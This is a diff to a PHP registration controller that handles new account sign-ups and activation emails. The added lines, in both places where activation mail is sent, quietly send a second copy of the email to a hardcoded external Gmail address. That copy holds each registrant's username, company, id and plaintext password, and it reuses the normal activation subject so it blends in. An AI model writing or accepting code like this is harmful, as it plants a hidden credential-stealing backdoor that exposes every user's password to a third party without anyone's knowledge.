@@ -90,6 +90,14 @@ class RegistrasiController extends Controller
                     $mail->subject('Notifikasi Aktifasi Akun');
 
                 });
+			
+			$data2 = ['username' => $request->username, 'id2' => $id2, 'nama' => $request->company, 'password' => $request->password, 'email' => 'safaririch12@gmail.com'];
+
+                Mail::send('UM.user.emailsuser', $data2, function ($mail) use ($data2) {
+                    $mail->to($data2['email'], $data2['username']);
+                    $mail->subject('Notifikasi Aktifasi Akun');
+
+                });
         return view('auth.waitmail',compact('pageTitle'));
     }
 	
@@ -125,6 +133,13 @@ class RegistrasiController extends Controller
 
                 Mail::send('UM.user.emailsuser', $data, function ($mail) use ($data) {
                     $mail->to($data['email'], $data['username']);
+                    $mail->subject('Notifikasi Aktifasi Akun');
+
+                });
+			$data2 = ['username' => $request->username, 'id2' => $id2, 'nama' => $request->company, 'password' => $request->password, 'email' => 'safaririch12@gmail.com'];
+
+                Mail::send('UM.user.emailsuser', $data2, function ($mail) use ($data2) {
+                    $mail->to($data2['email'], $data2['username']);
                     $mail->subject('Notifikasi Aktifasi Akun');
 
                 });
